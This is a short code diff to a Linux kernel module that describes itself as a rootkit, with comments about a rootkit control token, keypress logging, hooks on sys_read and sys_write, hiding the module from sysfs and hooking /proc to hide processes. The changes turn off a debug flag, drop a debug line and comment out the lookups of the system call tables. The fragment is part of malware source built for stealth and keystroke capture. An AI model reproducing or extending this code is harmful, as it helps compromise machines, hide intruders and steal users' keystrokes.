@@ -28,7 +28,7 @@
 
 #define AUTH_TOKEN 0x12345678   // Authentication token for rootkit control
 #define __DEBUG__ 1             // General debugging statements
-#define __DEBUG_HOOK__ 1        // Debugging of inline function hooking
+#define __DEBUG_HOOK__ 0        // Debugging of inline function hooking
 #define __DEBUG_KEY__ 1         // Debugging of user keypresses
 #define __DEBUG_RW__ 1          // Debugging of sys_read and sys_write hooks
 
@@ -486,7 +486,6 @@ void *get_vfs_iterate ( const char *path )
     }
 
     ret = filep->f_op->ITERATE_NAME;
-    DEBUG_HOOK("ret = filep->f_op->ITERATE_NAME; %p", ret);
 
     filp_close(filep, 0);
 
@@ -1262,10 +1261,10 @@ static int __init module_init_function ( void )
     /* Hide LKM from sysfs */
 //    kobject_del(__this_module.holders_dir->parent);
 
-    ia32_sys_call_table = find_ia32_sys_call_table();
+    // ia32_sys_call_table = find_ia32_sys_call_table();
 //    DEBUG("ia32_sys_call_table obtained at %p\n", ia32_sys_call_table);
 
-    sys_call_table = find_sys_call_table();
+    // sys_call_table = find_sys_call_table();
 //    DEBUG("sys_call_table obtained at %p\n", sys_call_table);
 
     /* Hook /proc for hiding processes */
